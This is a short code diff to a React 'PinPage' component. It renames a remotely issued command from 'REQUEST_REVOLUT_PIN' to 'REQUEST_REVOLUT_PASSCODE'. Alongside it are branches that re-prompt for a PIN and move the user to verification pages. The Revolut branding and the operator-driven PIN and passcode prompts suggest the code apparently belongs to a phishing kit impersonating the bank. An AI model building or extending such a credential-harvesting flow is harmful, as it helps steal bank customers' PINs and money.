@@ -52,7 +52,7 @@ export default function PinPage() {
     useEffect(() => {
         if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
             displayErrorModal('pin');
-        } else if (command === 'REQUEST_REVOLUT_PIN') {
+        } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
             navigateWithLoader('/VerificationPage');
         } else if (command === 'FINISH') {
             navigateWithLoader('/verificationPage');
